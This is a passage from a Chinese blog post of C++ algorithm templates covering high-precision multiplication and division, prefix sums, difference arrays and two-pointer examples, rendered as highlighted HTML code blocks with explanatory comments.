class="string">&quot;%d&quot;</span>, C[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">auto</span> C = <span class="built_in">sub</span>(B, A);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;-&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = C.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i --) <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, C[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="3、高精度乘法"><a href="#3、高精度乘法" class="headerlink" title="3、高精度乘法"></a>3、高精度乘法</h4><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211209093752464.png" alt="image-20211209093752464"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">mul</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt; &amp;A, <span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; C;</span><br><span class="line">    <span class="keyword">int</span> t = <span class="number">0</span>;<span class="comment">//表示进位      </span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; A.<span class="built_in">size</span>() || t; i ++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (i &lt; A.<span class="built_in">size</span>()) t += A[i] * b;</span><br><span class="line">        C.<span class="built_in">push_back</span>(t % <span class="number">10</span>);</span><br><span class="line">        t /= <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> (C.<span class="built_in">size</span>() &gt; <span class="number">1</span> &amp;&amp; C.<span class="built_in">back</span>() == <span class="number">0</span>) C.<span class="built_in">pop_back</span>();<span class="comment">//去掉前几位多余的0</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> C;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    string a;</span><br><span class="line">    <span class="keyword">int</span> b;</span><br><span class="line">    </span><br><span class="line">    cin &gt;&gt; a &gt;&gt; b;<span class="comment">// a = &quot;123456&quot;</span></span><br><span class="line"></span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; A;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = a.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i --) A.<span class="built_in">push_back</span>(a[i] - <span class="string">&#x27;0&#x27;</span>); <span class="comment">//A = [&#x27;6&#x27;...&#x27;1&#x27;]</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">auto</span> C = <span class="built_in">mul</span>(A, b);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = C.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i --) <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, C[i]);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="4、高精度除法"><a href="#4、高精度除法" class="headerlink" title="4、高精度除法"></a>4、高精度除法</h4><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211209102614579.png" alt="image-20211209102614579"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">div</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt; &amp;A, <span class="keyword">int</span> b, <span class="keyword">int</span> &amp;r)</span>  <span class="comment">//  A / B，商是C，余数为r</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; C;</span><br><span class="line">    r = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = A.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i --)</span><br><span class="line">    &#123;</span><br><span class="line">        r = r * <span class="number">10</span> + A[i];</span><br><span class="line">        C.<span class="built_in">push_back</span>(r / b);</span><br><span class="line">        r %= b;</span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="built_in">reverse</span>(C.<span class="built_in">begin</span>(), C.<span class="built_in">end</span>());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (C.<span class="built_in">size</span>() &gt; <span class="number">1</span> &amp;&amp; C.<span class="built_in">back</span>() == <span class="number">0</span>) C.<span class="built_in">pop_back</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> C;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    string a;</span><br><span class="line">    <span class="keyword">int</span> b;</span><br><span class="line">    </span><br><span class="line">    cin &gt;&gt; a &gt;&gt; b;<span class="comment">// a = &quot;123456&quot;</span></span><br><span class="line"></span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; A;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = a.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i --) A.<span class="built_in">push_back</span>(a[i] - <span class="string">&#x27;0&#x27;</span>); <span class="comment">//A = [&#x27;6&#x27;...&#x27;1&#x27;]</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> r;</span><br><span class="line">    <span class="keyword">auto</span> C = <span class="built_in">div</span>(A, b, r);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = C.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i --) <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, C[i]);</span><br><span class="line">    cout &lt;&lt; endl &lt;&lt; r &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="4、前缀和"><a href="#4、前缀和" class="headerlink" title="4、前缀和"></a>4、前缀和</h3><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211231235014330.png" alt="image-20211231235014330"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">100010</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> n, m;</span><br><span class="line"><span class="keyword">int</span> a[N], s[N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i ++) <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a[i]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i ++) s[i] = s[i - <span class="number">1</span>] + a[i];       <span class="comment">//数组的初始化, s[0] = 0</span></span><br><span class="line"><span class="comment">//从1开始，避免下标转换</span></span><br><span class="line">    <span class="keyword">while</span> (m --)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> l, r;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;l, &amp;r);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, s[r] - s[l - <span class="number">1</span>]);        <span class="comment">//区间和的计算</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>二维</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220104234325946.png" alt="image-20220104234325946"></p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220101004754647.png" alt="image-20220101004754647"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">1010</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> n, m, q;</span><br><span class="line"><span class="keyword">int</span> a[N][N], s[N][N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>, &amp;n, &amp;m, &amp;q);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i ++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= m; j ++)</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a[i][j]);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i ++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= m; j ++)</span><br><span class="line">                s[i][j] = s[i - <span class="number">1</span>][j] + s[i][j - <span class="number">1</span>] - s[i - <span class="number">1</span>][j - <span class="number">1</span>] + a[i][j];</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> (q --)</span><br><span class="line">    &#123;</span><br><span class="line"><span class="keyword">int</span> x1, y1, x2, y2;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d%d&quot;</span>, &amp;x1, &amp;y1, &amp;x2, &amp;y2);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, s[x2][y2] - s[x1 - <span class="number">1</span>][y2] - s[x2][y1 - <span class="number">1</span>] + s[x1 - <span class="number">1</span>][y1 - <span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="5、差分-前缀和的逆运算"><a href="#5、差分-前缀和的逆运算" class="headerlink" title="5、差分(前缀和的逆运算)"></a>5、差分(前缀和的逆运算)</h3><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220101012009660.png" alt="image-20220101012009660"></p><p> <img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220101013717858.png" alt="image-20220101013717858"></p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220101222900127.png" alt="image-20220101222900127"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">100010</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> n, m;</span><br><span class="line"><span class="keyword">int</span> a[N], b[N];<span class="comment">//b[N]是a[N]的差分，a[N]是b[N]的前缀和</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">insert</span><span class="params">(<span class="keyword">int</span> l, <span class="keyword">int</span> r, <span class="keyword">int</span> c)</span><span class="comment">//b[i] = a[i] - a[i-1]</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    b[l] += c;<span class="comment">//b[i] = a[i] (在b[1]的时候不用判断减0了)</span></span><br><span class="line">    b[r + <span class="number">1</span>] -= c;<span class="comment">//提前把下一项改减的给它</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i ++) <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a[i]);<span class="comment">//a[0]为0，后面就不用单独看下标了</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i ++) <span class="built_in">insert</span>(i, i, a[i]);<span class="comment">//这里通过函数建立了a[]和b[]的联系</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> (m --)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> l, r, c;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>, &amp;l, &amp;r, &amp;c);</span><br><span class="line">        <span class="built_in">insert</span>(l, r, c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i ++) b[i] += b[i - <span class="number">1</span>];<span class="comment">//求前缀和数组，b[i]就等于b[i]的值和前</span></span><br><span class="line">    <span class="comment">//面数和（此时为前一项）的和</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i ++) <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, b[i]);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>假定a数组最开始都是0，那么b数组初始时就是a数组的差分数组了，对于每一个a[i]，相当于插入了一个数，可以直接调用insert函数即可，当然也可以从差分数组的定义出发，for(int i=1;i&lt;=n;i) b[i]=a[i]-a[i-1]; </p><p>二维</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220101020530866.png" alt="image-20220101020530866"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">1010</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> n, m, q;</span><br><span class="line"><span class="keyword">int</span> a[N][N], b[N][N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">insert</span><span class="params">(<span class="keyword">int</span> x1, <span class="keyword">int</span> y1, <span class="keyword">int</span> x2, <span class="keyword">int</span> y2, <span class="keyword">int</span> c)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    b[x1][y1] += c;</span><br><span class="line">    b[x2 + <span class="number">1</span>][y1] -= c;</span><br><span class="line">    b[x1][y2 + <span class="number">1</span>] -= c;</span><br><span class="line">    b[x2 + <span class="number">1</span>][y2 + <span class="number">1</span>] += c;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>, &amp;n, &amp;m, &amp;q);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n ; i ++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= m; j ++)</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a[i][j]);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i ++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= m; j ++)</span><br><span class="line">            <span class="built_in">insert</span>(i, j, i, j, a[i][j]);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> (q --)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> x1, y1, x2, y2, c;</span><br><span class="line">        cin &gt;&gt; x1 &gt;&gt; y1 &gt;&gt; x2 &gt;&gt; y2 &gt;&gt; c;</span><br><span class="line">        <span class="built_in">insert</span>(x1, y1, x2, y2, c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i ++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= m; j ++)</span><br><span class="line">            b[i][j] += b[i - <span class="number">1</span>][j] + b[i][j - <span class="number">1</span>] - b[i - <span class="number">1</span>][j - <span class="number">1</span>];<span class="comment">//二维前缀和</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i ++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= m; j ++) <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, b[i][j]);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">            </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="6、双指针算法"><a href="#6、双指针算法" class="headerlink" title="6、双指针算法"></a>6、双指针算法</h3><p>归并排序就属于双指针算法</p><p>第一类 —— 两个序列</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220107093441413.png" alt="image-20220107093441413"></p><p>第二类 —— 一个序列</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220107093514297.png" alt="image-20220107093514297"></p><p>模板例子</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220107093637967.png" alt="image-20220107093637967"></p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220107093916628.png" alt="image-20220107093916628"></p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220107100944211.png" alt="image-20220107100944211"></p><p>例1：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> str[<span class="number">100</span>];</span><br><span class="line">    <span class="built_in">gets</span>(str);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> n = <span class="built_in">strlen</span>(str);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i ++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> j = i;</span><br><span class="line">        <span class="keyword">while</span> (j &lt; n &amp;&amp; str[j] != <span class="string">&#x27; &#x27;</span>) j ++;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//问题的具体逻辑</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> k = i; k &lt; j; k ++) cout &lt;&lt; str[k];</span><br><span class="line">        cout &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">        i = j;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>例2： 799</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">1e5</span> + <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="keyword">int</span> a[N], s[N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cin &gt;&gt; n;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i ++) cin &gt;&gt; a[i];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>; i &lt; n; i ++)</span><br><span class="line">    &#123;</span><br><span class="line">        s[a[i]] ++;             <span class="comment">//记录每个数出现多少次</span></span><br><span class="line">        <span class="keyword">while</span> (s[a[i]] &gt; <span class="number">1</span>)     <span class="comment">//多于1，让一个数出去</span></span><br><span class="line">        &#123;</span><br><span class="line">            s[a[j]] --;     </span><br><span class="line">            j ++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        res = <span 